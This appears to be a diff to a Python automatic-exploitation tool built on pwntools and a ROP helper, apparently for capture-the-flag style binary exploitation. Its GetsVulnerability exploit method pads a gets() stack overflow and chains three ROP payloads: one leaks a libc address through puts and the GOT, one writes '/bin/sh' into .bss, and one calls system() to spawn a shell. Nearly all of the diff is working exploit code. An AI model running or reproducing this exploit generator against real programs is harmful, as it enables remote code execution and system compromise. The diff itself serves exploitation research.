@@ -7,11 +7,10 @@ def register(clazz):
     # TODO: probably don't want to instantiate
     # here, makes more sense to instantiate
     # when the program context is available.
-    c = clazz()
-    ANALYSES.append(c)
+    ANALYSES.append(clazz)
 
 class Vulnerability:
-    def __init__(self, function, binary : ELF, libc : ELF):
+    def __init__(self, function, binary : pwn.ELF, libc : pwn.ELF):
         raise NotImplementedError()
 
     def detect(self, function, program):
@@ -37,56 +36,77 @@ class GetsVulnerability(Vulnerability):
                 return True
         return False
 
+    def entry(self):
+        return int(self.function["address"], 16)
+
     def exploit(self, conn):
-        function_addr = int(self.function["addr"], 16) 
+        conn = conn.conn
+        function_addr = int(self.function["address"], 16) 
         getscall = None
         for call in self.function["calls"]:
             if call["funcName"] == "gets":
                 getscall = call
-            break
+                break
         # assume stack for now
         # need to add check to validate
         # that the argument is on the stack.
         # otherwise, this is not exploitable
         # via this technique
         # TODO: Add check
+        print(getscall)
         arg = getscall["arguments"][0]
+        print(arg)
+        arg = [v for v in self.function["variables"] if v["name"] == arg][0]
+        print(arg)
         stackoffset = arg["stackOffset"]
         
-        prefix = "A"*stackoffset
+        prefix = b"A"*abs(stackoffset)
 
         # leak libc location
         sm = smrop.Smrop(binary=self.binary, libc=self.libc)
         sm.prefix(prefix)
         sm.pop_rdi(self.binary.got["gets"])
-        sm.ret(binary="puts")
-        sm.ret(function_addr)
+        # TODO: make puts a dependency
+        # TODO: abstract out puts to any print
+        sm.ret("puts", 'binary')
+        sm.ret(function_addr, "binary")
+        payload1 = sm.resolve(binary=0x0, libc=0x0)
 
-        payload1 = sm.resolve(binary=self.binary, libc=self.libc)
+        # clear out any pending stdout
+        print(conn.recv())
+        print(payload1)
 
         # read libc location
-        conn.recv()
-        conn.send(payload1)
-        gets_location = conn.recvline()
-        conn.recv()
-
+        print("Sending first payload")
+        conn.sendline(payload1)
+        gets_location = conn.recvline()[:-1]
+        print(gets_location)
+        gets_location = int.from_bytes(gets_location, byteorder='little')
         libcoffset = gets_location - self.libc.symbols["gets"]
+        print("Libc found at {}".format(hex(libcoffset)))
+
+        # clear out any pending stdout
+        conn.recv(timeout=1)
 
         # send /bin/sh
         sm = smrop.Smrop(binary=self.binary, libc=self.libc)
         sm.prefix(prefix)
-        sm.pop_rdi(self.binary.bss())
-        sm.ret(binary="gets")
-        sm.ret(function_addr)
-        payload2 = sm.resolve(binary=self.binary)
+        sm.pop_rdi(self.binary.bss()+0x100)
+        sm.ret("gets", "binary")
+        sm.ret(function_addr, "binary")
+        payload2 = sm.resolve(binary=0x0)
         
-        conn.send(payload2)
+        print("sending second payload")
+        conn.sendline(payload2)
+        conn.sendline("/bin/sh\x00")
 
-        sm = smrop.Smrop(bianry=self.binary, libc=self.libc)
+        sm = smrop.Smrop(binary=self.binary, libc=self.libc)
         sm.prefix(prefix)
-        sm.pop_rdi(self.binary.bss())
-        sm.ret(libc="system")
+        sm.pop_rdi(self.binary.bss()+0x100)
+        sm.nop()
+        sm.ret("system", "libc")
 
         payload3 = sm.resolve(binary=0x0, libc=libcoffset)
 
-        conn.send(payload3)
+        print("Sending final payload")
+        conn.sendline(payload3)
